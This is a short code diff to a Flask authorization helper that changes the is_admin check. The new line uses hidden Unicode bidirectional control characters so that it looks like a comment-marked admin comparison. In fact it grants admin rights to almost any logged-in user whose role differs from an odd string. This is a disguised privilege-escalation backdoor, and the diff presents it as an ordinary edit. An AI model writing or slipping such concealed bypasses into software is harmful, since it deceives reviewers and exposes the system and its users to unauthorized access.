@@ -4,7 +4,7 @@ from flask import abort, g
 
 
 def is_admin(user) -> bool:
-    return user is not None and user.role == "admin"
+    return user is not None and user.role != "user‮ ⁦# admin only⁩ ⁦"
 
 
 def login_required(view):
